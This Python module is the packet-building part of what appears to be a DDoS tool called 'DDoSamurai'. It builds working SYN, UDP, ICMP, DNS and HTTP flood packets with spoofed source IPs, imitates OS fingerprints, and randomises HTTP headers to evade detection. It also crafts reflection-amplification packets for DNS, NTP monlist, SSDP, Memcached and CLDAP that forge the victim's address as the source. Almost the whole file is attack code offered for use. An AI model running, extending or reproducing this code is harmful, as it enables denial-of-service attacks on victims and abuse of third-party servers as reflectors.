"""Packet utilities for DDoSamurai.

Contains functions for packet creation, sending, and advanced IP spoofing.
"""
import ipaddress
import logging
import random
from dataclasses import dataclass, field
from typing import List, Optional, Union

from .scapy_support import require_scapy

# Cached list of IPs from a file to avoid repeated disk I/O
_CACHED_IP_LIST = []

def _scapy():
    # Local helper to keep module importable when scapy is unavailable.
    return require_scapy()


# --- IP Spoofing Functions ---

def _generate_random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def _generate_realistic_ip():
    # Simplified for testing
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def _generate_ip_from_subnet(subnet: str):
    try:
        network = ipaddress.ip_network(subnet, strict=False)
        return str(ipaddress.ip_address(random.randint(int(network.network_address), int(network.broadcast_address))))
    except ValueError:
        logging.error(f"Geçersiz subnet formatı: {subnet}")
        return _generate_random_ip()

def _load_ips_from_file(file_path: str) -> list:
    global _CACHED_IP_LIST
    if _CACHED_IP_LIST:
        return _CACHED_IP_LIST
    try:
        with open(file_path, 'r') as f:
            _CACHED_IP_LIST = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        return _CACHED_IP_LIST
    except FileNotFoundError:
        logging.error(f"IP listesi dosyası bulunamadı: {file_path}")
        return []

def get_spoofed_ip(spoof_mode: str, spoof_options: dict) -> str:
    if spoof_mode == 'subnet':
        return _generate_ip_from_subnet(spoof_options.get('subnet'))
    elif spoof_mode == 'list':
        ip_list = _load_ips_from_file(spoof_options.get('file_path'))
        return random.choice(ip_list) if ip_list else _generate_random_ip()
    else:
        return _generate_realistic_ip()

# --- Packet Creation ---

def add_padding(packet, target_size):
    scapy = _scapy()
    current_size = len(bytes(packet))
    if current_size < target_size:
        padding_length = target_size - current_size
        packet = packet / scapy.Raw(load=b"\x00" * padding_length)
    return packet

@dataclass
class SpoofingOptions:
    mode: str = 'random'
    subnet: Optional[str] = None
    list_file: Optional[str] = None

@dataclass
class PacketConfig:
    target_ip: str
    target_port: int
    protocol: str = "tcp"
    spoof: bool = False
    spoof_opts: SpoofingOptions = field(default_factory=SpoofingOptions)
    payload: Optional[Union[bytes, str]] = None
    tcp_flags: str = "S"
    ttl: Optional[int] = None
    tos: Optional[int] = None
    window: Optional[int] = None
    fragment_enabled: bool = False
    # Fragmentation is applied in the sender (to avoid returning a list here).
    # This is the target IP fragment size (bytes) used when fragment_enabled=True.
    fragment_size: int = 800
    pad_size: int = 0
    attack_vector: str = "basic"
    dns_name: str = "example.com"
    dns_qtype: Union[str, List[str]] = "A"
    dns_edns: bool = False
    dns_recursive: bool = True

def _build_dns_packet(cfg: PacketConfig):
    scapy = _scapy()
    udp_layer = scapy.UDP(dport=cfg.target_port, sport=random.randint(1024, 65535))
    selected_qtype = random.choice(cfg.dns_qtype) if isinstance(cfg.dns_qtype, list) else cfg.dns_qtype
    dns_layer = scapy.DNS(rd=1 if cfg.dns_recursive else 0, qd=scapy.DNSQR(qname=cfg.dns_name, qtype=selected_qtype))
    if cfg.dns_edns:
        dns_layer.ar = scapy.DNSRROPT(rclass=4096)
    
    packet = scapy.IP(dst=cfg.target_ip)
    if cfg.spoof:
        packet.src = get_spoofed_ip(cfg.spoof_opts.mode, {'subnet': cfg.spoof_opts.subnet, 'file_path': cfg.spoof_opts.list_file})

    packet = packet / udp_layer / dns_layer
    if cfg.pad_size > 0: packet = add_padding(packet, cfg.pad_size)
    return packet

def _build_transport_packet(cfg: PacketConfig):
    scapy = _scapy()
    # OS Fingerprint Profiles
    os_profiles = {
        "windows": {"ttl": 128, "window": 64240, "options": [('MSS', 1460), ('NOP', None), ('NOP', None), ('SAckOK', b'')] },
        "linux":   {"ttl": 64,  "window": 29200, "options": [('MSS', 1460), ('SAckOK', b''), ('Timestamp', (123, 0)), ('NOP', None), ('WScale', 7)] },
        "ios":     {"ttl": 64,  "window": 65535, "options": [('MSS', 1460), ('NOP', None), ('WScale', 6), ('NOP', None), ('NOP', None), ('Timestamp', (123, 0)), ('SAckOK', b''), ('EOL', None)] }
    }
    
    selected_profile = random.choice(list(os_profiles.values()))

    ip_layer = scapy.IP(dst=cfg.target_ip)
    # Use user config if provided, otherwise use random OS profile
    ip_layer.ttl = cfg.ttl if cfg.ttl else selected_profile["ttl"]
    if cfg.tos is not None: ip_layer.tos = cfg.tos
    if cfg.spoof:
        ip_layer.src = get_spoofed_ip(cfg.spoof_opts.mode, {'subnet': cfg.spoof_opts.subnet, 'file_path': cfg.spoof_opts.list_file})

    if cfg.protocol.lower() == "tcp":
        tcp_options = selected_profile["options"]
        # Update Timestamp if present
        new_options = []
        for opt in tcp_options:
            if opt[0] == 'Timestamp':
                new_options.append(('Timestamp', (random.randint(1, 0xFFFFFFFF), 0)))
            else:
                new_options.append(opt)
        
        tcp_layer = scapy.TCP(dport=cfg.target_port, sport=random.randint(1024, 65535),
                        flags=cfg.tcp_flags, seq=random.randint(0, 0xFFFFFFFF), ack=random.randint(0, 0xFFFFFFFF),
                        options=new_options)
        
        tcp_layer.window = cfg.window if cfg.window else selected_profile["window"]
        packet = ip_layer / tcp_layer
    elif cfg.protocol.lower() == "udp":
        packet = ip_layer / scapy.UDP(dport=cfg.target_port, sport=random.randint(1024, 65535))
    elif cfg.protocol.lower() == "icmp":
        packet = ip_layer / scapy.ICMP()
    else:
        raise ValueError(f"Unsupported protocol: {cfg.protocol}")

    if cfg.payload:
        load = cfg.payload if isinstance(cfg.payload, (bytes, bytearray)) else str(cfg.payload).encode()
        packet = packet / scapy.Raw(load=load)
    elif cfg.attack_vector == "basic" or cfg.attack_vector == "tcp": # Only add random payload for basic/tcp floods if not specified
        # Dynamic Payload Randomization
        # Don't add payload for SYN-only packets (Stealth)
        if "S" in cfg.tcp_flags and "A" not in cfg.tcp_flags and "P" not in cfg.tcp_flags:
            pass
        else:
            payload_len = random.randint(16, 128)
            random_payload = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", k=payload_len))
            packet = packet / scapy.Raw(load=random_payload.encode())

    # Padding logic: ONLY if NOT a SYN flood (Stealth)
    is_syn_flood = "S" in cfg.tcp_flags and "A" not in cfg.tcp_flags and "P" not in cfg.tcp_flags
    
    if not is_syn_flood and cfg.pad_size > 0: 
        packet = add_padding(packet, cfg.pad_size)

    # Final Stealth Check:
    # If this is a SYN-only flood, absolutely NO payload is allowed.
    # We strip any Raw layer that might have sneaked in (via padding or logic error).
    if "S" in cfg.tcp_flags and "A" not in cfg.tcp_flags and "P" not in cfg.tcp_flags:
        if packet.haslayer(scapy.Raw):
            # Remove the Raw layer
            packet.getlayer(scapy.Raw).remove_payload()
        
    return packet

def _randomize_http_headers(target_ip, path="/", method="GET", user_agent=None):
    """
    Generates a raw HTTP request with randomized header order and casing.
    """
    if not user_agent:
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        
    headers = [
        ("Host", target_ip),
        ("User-Agent", user_agent),
        ("Accept", "*/*"),
        ("Accept-Language", "en-US,en;q=0.5"),
        ("Accept-Encoding", "gzip, deflate, br"),
        ("Connection", "keep-alive"),
        ("Upgrade-Insecure-Requests", "1"),
        ("Cache-Control", "max-age=0")
    ]
    
    # 1. Shuffle Headers
    random.shuffle(headers)
    
    # 2. Case Variation (Polymorphism)
    # Randomly change casing of header keys (e.g., User-Agent -> user-agent)
    final_headers = []
    for key, value in headers:
        if random.random() > 0.5:
            # Randomly lowercase
            key = key.lower()
        final_headers.append(f"{key}: {value}")
        
    # 3. Method Polymorphism (Whitespace)
    # GET / HTTP/1.1 -> GET   /  HTTP/1.1
    space1 = " " * random.randint(1, 3)
    space2 = " " * random.randint(1, 3)
    
    request_line = f"{method}{space1}{path}{space2}HTTP/1.1"
    
    payload = request_line + "\r\n" + "\r\n".join(final_headers) + "\r\n\r\n"
    return payload.encode()

def create_polymorphic_packet(cfg: PacketConfig):
    """
    Creates a packet with polymorphic payload (randomized headers, etc.)
    """
    scapy = _scapy()
    # Base packet (IP/TCP)
    pkt = _build_transport_packet(cfg)
    
    # If it's an HTTP attack, replace payload with polymorphic one
    if cfg.attack_vector in ["http", "slowloris", "http2"]:
        # Remove existing Raw layer if any
        if pkt.haslayer(scapy.Raw):
            # Scapy doesn't have easy remove_payload, just rebuild
            pass
            
        # Generate new polymorphic HTTP payload
        poly_payload = _randomize_http_headers(cfg.target_ip)
        # Reconstruct packet with new payload
        if pkt.haslayer(scapy.TCP):
             pkt = scapy.IP(dst=pkt[scapy.IP].dst, src=pkt[scapy.IP].src) / scapy.TCP(sport=pkt[scapy.TCP].sport, dport=pkt[scapy.TCP].dport, flags=pkt[scapy.TCP].flags, options=pkt[scapy.TCP].options) / scapy.Raw(load=poly_payload)
        
    return pkt

def create_packet(cfg: PacketConfig):
    if cfg.attack_vector == "dns":
        return _build_dns_packet(cfg)
    elif cfg.attack_vector in ["http", "slowloris", "http2"]:
        return create_polymorphic_packet(cfg)
    else:
        return _build_transport_packet(cfg)

# --- Amplification Packet Creators ---

def create_dns_amp_packet(reflector_ip: str, victim_ip: str, dns_name: str = "isc.org"):
    """Creates a DNS query packet for an amplification attack."""
    scapy = _scapy()
    return scapy.IP(src=victim_ip, dst=reflector_ip) / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname=dns_name, qtype=255))

def create_ntp_amp_packet(reflector_ip: str, victim_ip: str):
    """Creates an NTP 'monlist' query packet for an amplification attack."""
    scapy = _scapy()
    payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
    return scapy.IP(src=victim_ip, dst=reflector_ip) / scapy.UDP(sport=random.randint(1025, 65534), dport=123) / scapy.Raw(load=payload)

def create_ssdp_amp_packet(reflector_ip: str, victim_ip: str):
    """Creates an SSDP M-SEARCH query packet for an amplification attack."""
    scapy = _scapy()
    payload = (
        'M-SEARCH * HTTP/1.1\r\n'
        'HOST: 239.255.255.250:1900\r\n'
        'MAN: "ssdp:discover"\r\n'
        'MX: 1\r\n'
        'ST: ssdp:all\r\n\r\n'
    )
    return scapy.IP(src=victim_ip, dst=reflector_ip) / scapy.UDP(sport=random.randint(1025, 65534), dport=1900) / scapy.Raw(load=payload.encode())

def create_memcached_amp_packet(reflector_ip: str, victim_ip: str):
    """Creates a Memcached 'stats' query packet for an amplification attack."""
    scapy = _scapy()
    # Requesting 'stats' usually returns a large response
    payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
    return scapy.IP(src=victim_ip, dst=reflector_ip) / scapy.UDP(sport=random.randint(1025, 65534), dport=11211) / scapy.Raw(load=payload)

def create_ldap_amp_packet(reflector_ip: str, victim_ip: str):
    """Creates a CLDAP search request packet for an amplification attack."""
    scapy = _scapy()
    # Standard CLDAP search request for all objects
    payload = b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00'
    return scapy.IP(src=victim_ip, dst=reflector_ip) / scapy.UDP(sport=random.randint(1025, 65534), dport=389) / scapy.Raw(load=payload)
